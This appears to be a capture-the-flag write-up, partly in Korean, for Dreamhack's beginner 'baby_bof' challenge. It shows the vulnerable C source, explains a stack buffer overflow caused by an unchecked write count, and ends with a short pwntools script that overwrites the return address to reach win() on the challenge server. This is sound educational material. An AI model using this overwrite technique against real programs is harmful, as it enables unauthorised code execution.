# baby_bof - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: basic
- Provided Files: baby-bof.c, baby-bof(ELF)
- tools:
## Brief Description
Simple pwnable 101 challenge  
Q. What is Return Address?  
Q. Explain that why BOF is dangerous.
## Initial Analysis
### Environment
``` sh
checksec baby-bof
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
### Code
``` c
// gcc -o baby-bof baby-bof.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

void proc_init () {
  setvbuf (stdin, 0, 2, 0); setvbuf (stdout, 0, 2, 0);
  setvbuf (stderr, 0, 2, 0);
}

void win () {
  char flag[100] = {0,};
  int fd;
  puts ("You mustn't be here! It's a vulnerability!");

  fd = open ("./flag", O_RDONLY);
  read(fd, flag, 0x60);
  puts(flag);
  exit(0);
}

long count;
long value;
long idx = 0;
int main () {
  char name[16];

  // don't care this init function
  proc_init (); 

  printf ("the main function doesn't call win function (0x%lx)!\n", win);

  printf ("name: ");
  scanf ("%15s", name);

  printf ("GM GA GE GV %s!!\n: ", name);

  printf ("|  addr\t\t|  value\t\t|\n");
  for (idx = 0; idx < 0x10; idx++) {
    printf ("|  %lx\t|  %16lx\t|\n", name + idx *8, *(long*)(name + idx*8));
  }

  printf ("hex value: ");
  scanf ("%lx%c", &value);

  printf ("integer count: ");
  scanf ("%d%c", &count);


  for (idx = 0; idx < count; idx++) {
    *(long*)(name+idx*8) = value;
  }

  
  printf ("|  addr\t\t|  value\t\t|\n");
  for (idx = 0; idx < 0x10; idx++) {
    printf ("|  %lx\t|  %16lx\t|\n", name + idx *8, *(long*)(name + idx*8));
  }

  return 0;
}
```
사용자로부터 총 3번의 입력을 받는다. 첫 번째 입력은 name을 초기화 시키고, 두 번째 입력은 `value` 값을 초기화 하며, 마지막 세 번재 입력은 `count` 값을 초기화 한다. 이후 `name` 주소부터 시작해서 `count` 만큼 8byte 씩 `value` 값을 덮어쓴다.  
`win()` 함수에서 FLAG를 출력한다. 그러나 `main()` 함수에서 `win()` 함수를 호출하는 로직이 존재하지 않는다.  
## Vulnerability
### BOF(Buffer Overflow)
``` c
for (idx = 0; idx < count; idx++) {
    *(long*)(name+idx*8) = value;
}
```
`name`의 시작 주소부터 8byte씩 `value` 값으로 덮어쓴다.  
`name`의 크기는 0x10인 반면, 사용자로부터 입력 받는 `idx`의 크기를 검증/필터링하지 않아 BOF 취약점이 발생한다.  
## Exploit
### Strategy
canary와 PIE 모두 비활성화 되어있어, 간단하게 BOF 취약점을 이용해 `main()`의 Return Address를 `win()`의 주소로 덮어쓰면 FLAG를 얻을 수 있다.  
간단한 문제지만 payload를 작성할 때 주의할 점은, 메모리를 long 타입의 `value`의 값으로 덮어쓰기 때문에 평소 문자열로 주소를 덮어쓸 때처럼 `p64()` 함수를 통해 little endian으로 변환을 거치지 않고 그대로 입력해야 한다.  
### Exploitation Steps
### Stack Frame of main
| Variable Name | Offset from RBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| name | -0x10 |
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 23046) 

win_addr = 0x000000000040125b

p.sendlineafter(b'name: ', b'A'*8)
p.sendlineafter(b'hex value: ', b'0x40125b') 
p.sendlineafter(b'integer count: ', b'4')

p.interactive()
```
